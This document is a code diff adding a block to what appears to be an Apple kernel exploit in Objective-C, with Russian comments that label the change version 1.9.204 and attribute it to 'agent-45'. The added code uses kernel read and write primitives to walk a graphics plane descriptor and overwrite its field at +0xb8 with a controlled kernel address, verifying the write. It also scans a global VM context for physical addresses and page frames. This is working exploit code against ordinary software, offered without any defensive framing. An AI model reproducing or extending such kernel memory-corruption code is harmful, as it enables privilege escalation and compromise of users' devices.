@@ -6417,6 +6417,49 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             if (!parHitArr) kpNote(r, @"  [PAR] записи с backingPA в арене нет — источник глубже (pv_head?)");
         }
     }
+    // 1.9.204 (agent-45 р.52): ИСТОЧНИК ОТКАТА найден статикой — фабрика 0x86f3b34
+    // при каждом execute делает VM-резолюцию backing VA→PA (0x80d9304 по контексту
+    // [0x7b33f28]) и пересобирает дескриптор (0x86eb7cc: +0x98/+0x9c из spec+0x58).
+    // PATCH-POINT: [planeDesc+0xb8] = целевая VA. У нас +0xb8=0 (ranges-based desc)
+    // — проверяем/пробуем, плюс дампим VM-контекст и ищем VA-поле в НЕ-kernel
+    // формах (arena/юзер VA без 0xffffff — раньше отбрасывались фильтром).
+    {
+        uint64_t pd204 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
+        if (kpLooksLikeKernelPointer(pd204) && kpSafeToRead(pd204)) {
+            uint64_t b8 = early_kread64(pd204 + 0xb8);
+            kpNote(r, [NSString stringWithFormat:@"  [VDB] [planeDesc+0xb8] = %#018llx%@", (unsigned long long)b8,
+                      b8 ? @" — поле живое" : @" (ноль — ranges-based)"]);
+            if (b8 && kpLooksLikeKernelPointer(b8) && ctlKVA) {
+                uint64_t vb = early_kread64(b8);
+                kpNote(r, [NSString stringWithFormat:@"  [VDB] контент [b8]: %#018llx%@", (unsigned long long)vb,
+                          (uint32_t)vb == 0x41544159 ? @" ← МАРКЕР, поле то самое" : @""]);
+                if ((uint32_t)vb == 0x41544159) {
+                    early_kwrite64(pd204 + 0xb8, ctlKVA);
+                    uint64_t rb7 = early_kread64(pd204 + 0xb8);
+                    kpNote(r, [NSString stringWithFormat:@"  [VDB] ★ подмена [pd+0xb8] → ctlKVA: readback %#018llx — %@",
+                              (unsigned long long)rb7, rb7 == ctlKVA ? @"ПРИЛИПЛО" : @"МИМО"]);
+                    vaFldObj = pd204; vaFldOff = 0xb8; vaFldOld = b8;   // restore общим путём
+                }
+            }
+        }
+        // дамп глобального VM-контекста [0x7b33f28] (арена-аллокатор фабрики)
+        uint64_t ks204 = kconstant(base) - 0xfffffff007004000ULL;
+        uint64_t ctxSym = 0xfffffff007b33f28ULL + ks204;
+        uint64_t vmctx = early_kread64(ctxSym);
+        kpNote(r, [NSString stringWithFormat:@"  [VDB] vmctx [0x7b33f28]=%#llx (sym %#llx)", (unsigned long long)vmctx, (unsigned long long)ctxSym]);
+        if (kpLooksLikeKernelPointer(vmctx) && kpSafeToRead(vmctx)) {
+            for (uint32_t o = 0; o + 8 <= 0x200; o += 8) {
+                uint64_t q = early_kread64(vmctx + o);
+                if (!q) continue;
+                const char *tag = "";
+                if (q == backingPA) tag = " ← backingPA!";
+                else if (q == backKVA) tag = " ← backKVA!";
+                else if ((uint32_t)(q >> 32) == (uint32_t)(backingPA >> 14) || (uint32_t)q == (uint32_t)(backingPA >> 14)) tag = " ← pfn!";
+                else if (q == (uint64_t)pix) tag = " ← pix user VA!";
+                kpNote(r, [NSString stringWithFormat:@"    vmctx+%#x: %#018llx%s", o, (unsigned long long)q, tag]);
+            }
+        }
+    }
     // 3. Trusted-path резолв surfVA через M2 async op-entry (1.9.124):
     //    async submit резолвит surface ptr в op-entry БЕЗ execute/снапшота
     //    (раунд 13: DVA-снапшот только при execute). Вся цепочка — из РЕАЛЬНЫХ
